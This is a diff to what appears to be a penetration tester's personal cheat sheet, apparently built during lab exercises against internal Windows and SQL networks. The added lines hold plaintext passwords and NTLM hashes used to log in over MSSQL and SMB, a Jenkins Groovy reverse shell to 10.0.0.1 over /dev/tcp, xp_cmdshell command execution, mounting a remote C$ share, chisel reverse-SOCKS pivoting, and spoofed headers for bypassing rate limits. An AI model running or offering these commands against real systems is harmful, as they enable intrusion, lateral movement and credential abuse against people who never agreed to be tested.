@@ -195,6 +195,9 @@ aad3b435b51404eeaad3b435b51404ee
 [nikto cheatsheet]
 https://redteamtutorials.com/2018/10/24/nikto-cheatsheet/
 
+[sqsh:mssql connect]
+sqsh -S 172.16.1.5 -U sophie -P 'TerrorInflictPurpleDirt996655'
+
 [mysql: read file]
 select load_file('/tmp/data.blob')
 
@@ -315,6 +318,7 @@ GetNPUsers.py roast.csl/ -dc-ip 10.10.10.10 -no-pass -usersfile users
 
 [smb with hash]
 smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:0ce1cb01ade331cdba32d0e1fba338a1 ADMIN.offshore.com/bankvault@172.16.4.31
+smbclient.py CORE.cyber.local/george.wirth:'v765#QLm^8'@10.9.10.10 -dc-ip 10.9.10.10
 smbmap -H 172.16.4.31 -u bankvault -p aad3b435b51404eeaad3b435b51404ee:0ce1cb01ade331cdba32d0e1fba338a1 -d ADMIN.offshore.com
 
 [Impoersonate_tokens: PrintSpoofer]
@@ -477,11 +481,17 @@ public class testprog {
 }
 ```
 
-* jenkins
+* jenkins#1
 ```
 def command = "whoami"
 def proc = command.execute()
 println(proc.in.text)
+```
+* jenkins#2
+```
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
 ```
 
 [ld preload privilege escalation]
@@ -694,7 +704,10 @@ Command=ToggleDesktop
 [ps credential]
 $username = 'CORP.local\cleark'
 $password = convertto-securestring -Force -AsPlainText "P@$$w0rd!"
-$cred = New-Object System.Management.Automation.PSCredential -ArgumentList($username,$password)
+$cred = New-Object System.Management.Automation.PSCredential($username,$password)
+
+[PSDrive]
+New-PSDrive -Credential $cred -PSProvider FileSystem -Name ch4rm \\10.10.10.10\C$
 
 [powerupsql]
 # cheatsheet
@@ -703,3 +716,17 @@ https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
 Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "m3sqlw.m3c.local"'
 # execute command
 Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "m3sqlw.m3c.local"'
+
+[pivoting: chisel]
+#listen 
+./chisel server -p 8001 --reverse
+#remote 
+./chisel client 10.10.10.10:8001 R:1080:socks
+
+[limit rate bypass]
+X-Forwarded-For : IP
+X-Forwarded-Host : IP
+X-Client-IP : IP
+X-Remote-IP : IP
+X-Remote-Addr : IP
+X-Host : IP
